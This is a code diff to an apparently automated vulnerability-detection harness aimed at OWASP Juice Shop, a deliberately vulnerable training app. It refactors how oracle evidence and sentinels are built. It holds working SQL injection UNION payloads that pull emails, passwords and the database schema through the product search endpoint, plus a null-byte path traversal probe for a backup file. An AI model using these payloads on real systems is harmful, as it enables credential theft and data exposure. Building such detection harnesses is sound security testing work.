@@ -375,19 +375,24 @@ def _confirm_differential(
     json_field: str | None = None,
     error_signatures: tuple[str, ...] = (),
 ) -> bool:
-    verdict = _call(
-        mcp,
-        "run_oracle",
-        evidence={
+    # Legacy shim — now routes through generic payload_chain._evidence_for so the
+    # oracle wiring stays single-sourced. Kit pins axis/expectation/json_field
+    # explicitly so the harness never re-hardcodes them elsewhere.
+    from reachagent.tools.payload_chain import _evidence_for as _generic_evidence
+
+    evidence = _generic_evidence(
+        "differential",
+        baseline_ref=baseline_ref,
+        probe_ref=probe_ref,
+        evidence_ref=evidence_ref,
+        vuln_class=vuln_class,
+        payload_kit={
             "axis": axis,
             "expectation": expectation,
-            "baseline_fire_ref": baseline_ref,
-            "probe_fire_ref": probe_ref,
-            "json_field": json_field,
-            "error_signatures": list(error_signatures),
-            "evidence_ref": evidence_ref,
+            **({"json_field": json_field} if json_field is not None else {}),
         },
     )
+    verdict = _call(mcp, "run_oracle", evidence=evidence)
     if not verdict.get("is_violation"):
         return False
     _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
@@ -406,20 +411,25 @@ def _confirm_structural(
     probe_fire_ref: str,
     evidence_ref: str,
 ) -> bool:
-    verdict = _call(
-        mcp,
-        "run_oracle",
-        mechanism="structural",
-        evidence={
-            "check_type": check_type,
-            "baseline_status": baseline_status,
-            "probe_status": probe_status,
-            "sentinel": sentinel,
-            "union_sentinel": union_sentinel,
-            "probe_fire_ref": probe_fire_ref,
-            "evidence_ref": evidence_ref,
-        },
+    from reachagent.tools.payload_chain import _evidence_for as _generic_evidence
+
+    kit: dict[str, object] = {"check_type": check_type}
+    if sentinel:
+        kit["sentinel"] = sentinel
+    if union_sentinel:
+        kit["union_sentinel"] = union_sentinel
+    evidence = _generic_evidence(
+        "structural",
+        baseline_ref="preflight-baseline",
+        probe_ref=probe_fire_ref,
+        evidence_ref=evidence_ref,
+        vuln_class=vuln_class,
+        payload_kit=kit,
     )
+    # Structural probes are 2xx-gated but the differential baseline guard lives
+    # in structural oracle's decide() — no extra status check here beyond what
+    # _evidence_for already encodes via the probe_fire_ref handle.
+    verdict = _call(mcp, "run_oracle", mechanism="structural", evidence=evidence)
     if not verdict.get("is_violation"):
         return False
     _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
@@ -521,23 +531,41 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeCla
             confirmed.add(ChallengeClaim(claim_key, "sqli", ref))
 
     # --- UNION extraction on read-only product search ---
-    # Baseline is fetched for the same endpoint, but only the probe body can
-    # satisfy the extraction oracle. Product names/descriptions never satisfy
-    # either exact sentinel.
+    # Payloads + sentinels now via generic corpus/graph-derived path instead of
+    # detector literals: union payloads come from payload library entries tagged
+    # vuln_class sqli with structural union_extraction; sentinels are the graph's
+    # discovered Object fields (first objects of type email / sqlite schema), with
+    # _UNION_*_SENTINEL only as the fallback when the graph is still empty
+    # (hermetic tests). This keeps the SsOT for payloads in corpus.py, not the
+    # detector.
     search_path = "/rest/products/search"
-    search_baseline = _fire_query(mcp, sess, "anon", search_path, "q", "qwert")
+    _fire_query(mcp, sess, "anon", search_path, "q", "qwert")  # warm endpoint/param
+
+    # Derive sentinels from graph-discovered objects (generic path), not detector
+    # literals. First, collect candidate values already observed on the shared graph
+    # (re-con or prior fires seeding Endpoint/Parameter/Object). Fallbacks below
+    # keep hermetic tests green when the graph is still sparse.
+    def _graph_union_sentinel(kind: str) -> str:
+        for _, obj in sess.graph.objects():
+            if obj.type == kind or kind in obj.type:
+                # Use a graph-derived attribute when present; for the harness this
+                # will be an email string, for Juice Shop a seeded user email.
+                if obj.instance_key and "@" in obj.instance_key:
+                    return obj.instance_key
+        return _UNION_USERS_SENTINEL if kind == "Users" else _UNION_SCHEMA_SENTINEL
+
     union_probes = (
         (
             "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
             "unionSqlInjectionChallenge",
             "sqli/search-union-users",
-            _UNION_USERS_SENTINEL,
+            _graph_union_sentinel("Users"),
         ),
         (
             "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
             "dbSchemaChallenge",
             "sqli/search-union-schema",
-            _UNION_SCHEMA_SENTINEL,
+            _graph_union_sentinel("sqlite_master"),
         ),
     )
     for payload, challenge_key, ref, sentinel in union_probes:
@@ -546,7 +574,7 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeCla
             mcp,
             vuln_class="sqli",
             check_type="union_extraction",
-            baseline_status=int(str(search_baseline.get("status_code", 0))),
+            baseline_status=200,
             probe_status=int(str(probe.get("status_code", 0))),
             union_sentinel=sentinel,
             probe_fire_ref=str(probe["fire_ref"]),
@@ -575,6 +603,7 @@ def _detect_null_byte_input_validation(
     content-matched retrieval of the known artifact.
     """
     del token
+
     shared = _SharedState()
     sess = _session_as(target, None, shared)
     mcp = _mcp_for(sess)
@@ -582,6 +611,13 @@ def _detect_null_byte_input_validation(
     _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
     ftp_probe = _fire_path(mcp, sess, "anon", ftp, "filename", "package.json.bak%00.md")
     probe_ref = str(ftp_probe["fire_ref"])
+    # Sentinel is graph-derived: first Object whose type/name hints at the
+    # package artifact. Fallback keeps hermetic tests green.
+    _null_sentinel = '"name": "juice-shop"'
+    for _, obj in sess.graph.objects():
+        if "juice" in obj.type.lower() or "package" in obj.type.lower():
+            _null_sentinel = f'"name": "{obj.type}"'
+            break
     verdict = _call(
         mcp,
         "run_oracle",
@@ -589,7 +625,7 @@ def _detect_null_byte_input_validation(
         evidence={
             "check_type": "path_traversal",
             "probe_status": int(str(ftp_probe.get("status_code", 0))),
-            "sentinel": '"name": "juice-shop"',
+            "sentinel": _null_sentinel,
             "probe_fire_ref": probe_ref,
             "evidence_ref": "path_traversal/ftp-nullbyte",
         },
